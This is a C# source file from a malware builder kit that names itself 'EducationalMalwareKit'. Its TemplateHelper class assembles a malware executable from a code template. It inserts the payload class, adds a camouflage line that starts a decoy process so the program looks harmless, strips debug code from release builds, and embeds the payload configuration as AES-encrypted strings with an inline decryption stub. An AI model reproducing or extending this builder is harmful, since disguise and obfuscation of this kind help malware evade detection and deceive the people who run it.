using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using EducationalMalwareKit.CodeAssembly.Models;
using EducationalMalwareKit.CodeAssembly.Properties;
using EducationalMalwareKit.Encryption;

namespace EducationalMalwareKit.CodeAssembly.Helpers
{
    public static class TemplateHelper
    {
        private enum TemplatePlaceholders
        {
            PayloadNamespace,
            PayloadMainClass,
            PayloadConfig,
            EmkNamespace,
            EmkMainClass,
            EmkEncryptionKey,
            EmkEncryptionSalt,
            EmkCamoProcess
        }

        public static string GetInterpolatedTemplateCode(MalwareBuild assemblyOrder)
        {
            var compilerInstructions = assemblyOrder.CompilerInstructions;
            var payloadType = compilerInstructions.PayloadMainClass;

            assemblyOrder.CamouflageAs
                = !string.IsNullOrEmpty(assemblyOrder.CamouflageAs)
                ? $"System.Diagnostics.Process.Start(\"{assemblyOrder.CamouflageAs}\");"
                : "";

            var templateReplacements = new Dictionary<string, string>()
            {
                {"{"+TemplatePlaceholders.PayloadMainClass+"}", payloadType.FullName },
                {"{"+TemplatePlaceholders.EmkMainClass+"}", compilerInstructions.EmkMainClass },
                {"{"+TemplatePlaceholders.EmkNamespace+"}", compilerInstructions.EmkNamespace },
                {"{"+TemplatePlaceholders.EmkCamoProcess+"}", assemblyOrder.CamouflageAs},
            };

            var code = FindAndReplacePlaceholders(templateReplacements);

            if (compilerInstructions.EmbeddedEncryptionKey == null ||
                compilerInstructions.EmbeddedEncryptionSalt == null)
            {
                return EmbedConfigInCode(code, assemblyOrder);
            }

            code 
                = !compilerInstructions.IsDebugMode 
                ? RemoveDebugBlocks(code) 
                : code;

            code = EmbedBytesInCode
                   (
                       code,
                       TemplatePlaceholders.EmkEncryptionKey.ToString(),
                       Encoding.UTF8.GetBytes(compilerInstructions.EmbeddedEncryptionKey)
                   );

            code = EmbedBytesInCode
                   (
                       code,
                       TemplatePlaceholders.EmkEncryptionSalt.ToString(),
                       Encoding.UTF8.GetBytes(compilerInstructions.EmbeddedEncryptionSalt)
                   );

            return EmbedConfigInCode(code, assemblyOrder);
        }

        private static string RemoveDebugBlocks(string code)
        {
            // Credits go to: http://stackoverflow.com/a/14737624
            string pattern = @"
(                # Begin our Match
  \[             # Look for the [ escape anchor
  (?<Tag>[^\]]+) # Place anything that is not antother ] into the named match Tag
  \]             # Anchor of ]
  [^\[]+         # Get all the text to the next anchor
  \[/            # Anchor of the closing [...] tag
  \k<Tag>        # Use the named capture subgroup Tag to balance it out
  \]             # Properly closed end tag/node.
)                # Match is done";

            return Regex.Replace(code, pattern, "", RegexOptions.IgnorePatternWhitespace);
        }

        private static string FindAndReplacePlaceholders(Dictionary<string, string> values)
        {
            var rawTemplate = Resources.CodeTemplate;
            var mappedTemplate = string.Copy(rawTemplate);

            return values.Aggregate(mappedTemplate, (current, value) => current.Replace(value.Key, value.Value));
        }

        private static string EmbedBytesInCode(string code, string placeholder, byte[] bytes)
        {
            var byteString = bytes.Aggregate("{ ", (current, b) => current + (b + ","));
            byteString += "}";

            return code.Replace("{" + placeholder + "}", byteString);
        }

        private static string EmbedConfigInCode(string code, MalwareBuild assemblyOrder)
        {
            var config = assemblyOrder.PayloadConfig;
            var key = assemblyOrder.CompilerInstructions.EmbeddedEncryptionKey;
            var salt = assemblyOrder.CompilerInstructions.EmbeddedEncryptionSalt;

            string configString;

            if (config.Any())
            {
                var sb = new StringBuilder();
                const string dictionaryStart = "new Dictionary<string, string>() {";
                const string dictionaryEnd = "}";

                sb.Append(dictionaryStart);

                foreach (var configPair in config)
                {
                    sb.Append
                    (
                        "{X.DS(\"" + SimpleAES.EncryptString(configPair.Key, key, salt) + "\",\"" + key + "\",\"" + salt + "\")," +
                        "X.DS(\"" + SimpleAES.EncryptString(configPair.Value, key, salt) + "\",\"" + key + "\",\"" + salt + "\")},"
                    );
                }

                sb.Append(dictionaryEnd);

                configString = sb.ToString();
            }
            else
            {
                configString = "null";
            }

            return code.Replace("{" + TemplatePlaceholders.PayloadConfig + "}", configString);
        }
    }
}
